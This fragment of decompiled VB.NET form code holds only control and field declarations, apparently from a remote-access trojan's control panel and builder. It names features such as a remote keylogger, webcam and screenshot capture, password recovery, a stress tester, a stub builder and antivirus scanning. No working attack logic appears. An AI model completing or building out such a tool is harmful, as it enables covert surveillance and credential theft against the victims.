        <AccessedThroughProperty("FlatLabel1")> _
        Private _FlatLabel1 As FlatLabel
        <AccessedThroughProperty("FlatLabel10")> _
        Private _FlatLabel10 As FlatLabel
        <AccessedThroughProperty("FlatLabel11")> _
        Private _FlatLabel11 As FlatLabel
        <AccessedThroughProperty("FlatLabel12")> _
        Private _FlatLabel12 As FlatLabel
        <AccessedThroughProperty("FlatLabel13")> _
        Private _FlatLabel13 As FlatLabel
        <AccessedThroughProperty("FlatLabel14")> _
        Private _FlatLabel14 As FlatLabel
        <AccessedThroughProperty("FlatLabel15")> _
        Private _FlatLabel15 As FlatLabel
        <AccessedThroughProperty("FlatLabel16")> _
        Private _FlatLabel16 As FlatLabel
        <AccessedThroughProperty("FlatLabel17")> _
        Private _FlatLabel17 As FlatLabel
        <AccessedThroughProperty("FlatLabel18")> _
        Private _FlatLabel18 As FlatLabel
        <AccessedThroughProperty("FlatLabel19")> _
        Private _FlatLabel19 As FlatLabel
        <AccessedThroughProperty("FlatLabel2")> _
        Private _FlatLabel2 As FlatLabel
        <AccessedThroughProperty("FlatLabel20")> _
        Private _FlatLabel20 As FlatLabel
        <AccessedThroughProperty("FlatLabel21")> _
        Private _FlatLabel21 As FlatLabel
        <AccessedThroughProperty("FlatLabel3")> _
        Private _FlatLabel3 As FlatLabel
        <AccessedThroughProperty("FlatLabel4")> _
        Private _FlatLabel4 As FlatLabel
        <AccessedThroughProperty("FlatLabel5")> _
        Private _FlatLabel5 As FlatLabel
        <AccessedThroughProperty("FlatLabel6")> _
        Private _FlatLabel6 As FlatLabel
        <AccessedThroughProperty("FlatLabel7")> _
        Private _FlatLabel7 As FlatLabel
        <AccessedThroughProperty("FlatLabel8")> _
        Private _FlatLabel8 As FlatLabel
        <AccessedThroughProperty("FlatLabel9")> _
        Private _FlatLabel9 As FlatLabel
        <AccessedThroughProperty("FlatStatusBar1")> _
        Private _FlatStatusBar1 As FlatStatusBar
        <AccessedThroughProperty("FormSkin1")> _
        Private _FormSkin1 As FormSkin
        <AccessedThroughProperty("FromLinkToolStripMenuItem")> _
        Private _FromLinkToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("HostToolStripMenuItem")> _
        Private _HostToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ip")> _
        Private _ip As ColumnHeader
        <AccessedThroughProperty("Labelstubinfo")> _
        Private _Labelstubinfo As Label
        <AccessedThroughProperty("LinkLabel1")> _
        Private _LinkLabel1 As LinkLabel
        <AccessedThroughProperty("ListView1")> _
        Private _ListView1 As ListView
        <AccessedThroughProperty("listviewmain")> _
        Private _listviewmain As ListView
        <AccessedThroughProperty("ListViewNews")> _
        Private _ListViewNews As ListView
        <AccessedThroughProperty("ListViewScan")> _
        Private _ListViewScan As ListView
        <AccessedThroughProperty("location")> _
        Private _location As ColumnHeader
        <AccessedThroughProperty("MapViewToolStripMenuItem")> _
        Private _MapViewToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("MaxButton")> _
        Private _MaxButton As FlatMax
        <AccessedThroughProperty("MenuStrip1")> _
        Private _MenuStrip1 As MenuStrip
        <AccessedThroughProperty("MiniButton")> _
        Private _MiniButton As FlatMini
        <AccessedThroughProperty("MiscellaneousToolStripMenuItem")> _
        Private _MiscellaneousToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("NetSealtb1")> _
        Private _NetSealtb1 As FlatLabel
        <AccessedThroughProperty("NetSealtb2")> _
        Private _NetSealtb2 As FlatLabel
        <AccessedThroughProperty("NetSealtb3")> _
        Private _NetSealtb3 As FlatLabel
        <AccessedThroughProperty("NetSealtb4")> _
        Private _NetSealtb4 As FlatLabel
        <AccessedThroughProperty("NetSealtb5")> _
        Private _NetSealtb5 As FlatLabel
        <AccessedThroughProperty("Notify")> _
        Private _Notify As NotifyIcon
        <AccessedThroughProperty("notifyrightclick")> _
        Private _notifyrightclick As ContextMenuStrip
        <AccessedThroughProperty("Opennsbtn")> _
        Private _Opennsbtn As FlatStickyButton
        <AccessedThroughProperty("os")> _
        Private _os As ColumnHeader
        <AccessedThroughProperty("OSToolStripMenuItem")> _
        Private _OSToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("PageBuilder")> _
        Private _PageBuilder As TabPage
        <AccessedThroughProperty("PageMain")> _
        Private _PageMain As TabPage
        <AccessedThroughProperty("PageNews")> _
        Private _PageNews As TabPage
        <AccessedThroughProperty("PageSettings")> _
        Private _PageSettings As TabPage
        <AccessedThroughProperty("Panel1")> _
        Private _Panel1 As Panel
        <AccessedThroughProperty("Panel2")> _
        Private _Panel2 As Panel
        <AccessedThroughProperty("PasswordRecoveryToolStripMenuItem")> _
        Private _PasswordRecoveryToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("pb_scan")> _
        Private _pb_scan As PictureBox
        <AccessedThroughProperty("PictureBox_Icon")> _
        Private _PictureBox_Icon As PictureBox
        <AccessedThroughProperty("PictureBox1")> _
        Private _PictureBox1 As PictureBox
        <AccessedThroughProperty("PingToolStripMenuItem")> _
        Private _PingToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("priv")> _
        Private _priv As ColumnHeader
        <AccessedThroughProperty("PrivilegsToolStripMenuItem")> _
        Private _PrivilegsToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ProgressBar1")> _
        Private _ProgressBar1 As FlatProgressBar
        <AccessedThroughProperty("rb_appdata")> _
        Private _rb_appdata As RadioButton
        <AccessedThroughProperty("rb_temp")> _
        Private _rb_temp As RadioButton
        <AccessedThroughProperty("RemoteKeyloggerToolStripMenuItem")> _
        Private _RemoteKeyloggerToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("RemoteScreenshotToolStripMenuItem")> _
        Private _RemoteScreenshotToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("RestartToolStripMenuItem1")> _
        Private _RestartToolStripMenuItem1 As ToolStripMenuItem
        <AccessedThroughProperty("rightclick")> _
        Private _rightclick As ContextMenuStrip
        <AccessedThroughProperty("rtb_output")> _
        Private _rtb_output As RichTextBox
        <AccessedThroughProperty("rtbnews")> _
        Private _rtbnews As RichTextBox
        <AccessedThroughProperty("scans")> _
        Private _scans As ColumnHeader
        <AccessedThroughProperty("server")> _
        Private _server As ColumnHeader
        <AccessedThroughProperty("ServerOptionsToolStripMenuItem")> _
        Private _ServerOptionsToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ShowToolStripMenuItem")> _
        Private _ShowToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("STRESSTesterToolStripMenuItem")> _
        Private _STRESSTesterToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("SurveillanceToolStripMenuItem")> _
        Private _SurveillanceToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("SystemInformationToolStripMenuItem")> _
        Private _SystemInformationToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("TabControl1")> _
        Private _TabControl1 As FlatTabControl
        <AccessedThroughProperty("TabPage1")> _
        Private _TabPage1 As TabPage
        <AccessedThroughProperty("TabPage2")> _
        Private _TabPage2 As TabPage
        <AccessedThroughProperty("TabPage3")> _
        Private _TabPage3 As TabPage
        <AccessedThroughProperty("TabPage4")> _
        Private _TabPage4 As TabPage
        <AccessedThroughProperty("TabPage5")> _
        Private _TabPage5 As TabPage
        <AccessedThroughProperty("TabPage6")> _
        Private _TabPage6 As TabPage
        <AccessedThroughProperty("TabPage7")> _
        Private _TabPage7 As TabPage
        <AccessedThroughProperty("TabPage8")> _
        Private _TabPage8 As TabPage
        <AccessedThroughProperty("TabPage9")> _
        Private _TabPage9 As TabPage
        <AccessedThroughProperty("tb_assemblycompany")> _
        Private _tb_assemblycompany As FlatTextBox
        <AccessedThroughProperty("tb_assemblycopyright")> _
        Private _tb_assemblycopyright As FlatTextBox
        <AccessedThroughProperty("tb_assemblydescription")> _
        Private _tb_assemblydescription As FlatTextBox
        <AccessedThroughProperty("tb_assemblyfileversion")> _
        Private _tb_assemblyfileversion As FlatTextBox
        <AccessedThroughProperty("tb_assemblyproduct")> _
        Private _tb_assemblyproduct As FlatTextBox
        <AccessedThroughProperty("tb_assemblytitle")> _
        Private _tb_assemblytitle As FlatTextBox
        <AccessedThroughProperty("tb_assemblytrademark")> _
        Private _tb_assemblytrademark As FlatTextBox
        <AccessedThroughProperty("tb_assemblyversion")> _
        Private _tb_assemblyversion As FlatTextBox
        <AccessedThroughProperty("tb_host")> _
        Private _tb_host As FlatComboBox
        <AccessedThroughProperty("tb_install_path")> _
        Private _tb_install_path As FlatTextBox
        <AccessedThroughProperty("tb_runfile")> _
        Private _tb_runfile As FlatTextBox
        <AccessedThroughProperty("tb_web")> _
        Private _tb_web As FlatTextBox
        <AccessedThroughProperty("time")> _
        Private _time As ColumnHeader
        <AccessedThroughProperty("title")> _
        Private _title As ColumnHeader
        <AccessedThroughProperty("toggledownload")> _
        Private _toggledownload As FlatToggle
        <AccessedThroughProperty("toggleweb")> _
        Private _toggleweb As FlatToggle
        <AccessedThroughProperty("ToolStripMenuItem1")> _
        Private _ToolStripMenuItem1 As ToolStripMenuItem
        <AccessedThroughProperty("UninstallToolStripMenuItem")> _
        Private _UninstallToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("updateserver")> _
        Private _updateserver As Timer
        <AccessedThroughProperty("UpdateServerToolStripMenuItem")> _
        Private _UpdateServerToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("user")> _
        Private _user As ColumnHeader
        <AccessedThroughProperty("ver")> _
        Private _ver As ColumnHeader
        <AccessedThroughProperty("WebcamToolStripMenuItem")> _
        Private _WebcamToolStripMenuItem As ToolStripMenuItem
        Private av As String()
        Private avscan As String()
        Private cleansource As String
        Private client As API
        Private components As IContainer
        Private connected As Boolean()
        Private createserver As Thread
        Private curconnected As String
        Private getstubinfo As Thread
        Private groupparameter As Integer
        Private host As ToolStripMenuItem()
        Private i As Integer
        Private icnpath As String
        Private ID As Integer
        Private itemscountafter As String
        Private itemscountbefore As String
        Private ntf As String
        Private onc As Integer
        Private path As String
        Private retrieve As Thread
        Private scan As String()
        Private scanning As Thread
        Private settings As String
        Private tbhost As String
        Private x As Thread

        ' Nested Types
        Public Delegate Sub DelegateAdditems(ByVal listview As ListView, ByVal [text] As String)

        Public Delegate Sub DelegateAddSubitems(ByVal listview As ListView, ByVal [text] As String, ByVal index As Integer)

        Public Delegate Sub Delegatechangecolor(ByVal listview As ListView, ByVal index As Integer, ByVal color As Color)

        Public Delegate Sub delegatechangeimage(ByVal pb As PictureBox)

        Public Delegate Sub Delegateresize(ByVal o As Object)

        Public Delegate Sub DelegateWriteOutput(ByVal rtb As RichTextBox, ByVal [text] As String)

        Public Delegate Sub DelegateWriteText(ByVal label As StatusBar, ByVal [text] As String)

        Public Delegate Sub DelegateWriteText2(ByVal label As Label, ByVal [text] As String)

        Public Delegate Sub DelegateWriteText3(ByVal label As LinkLabel, ByVal [text] As String)
    End Class
End Namespace

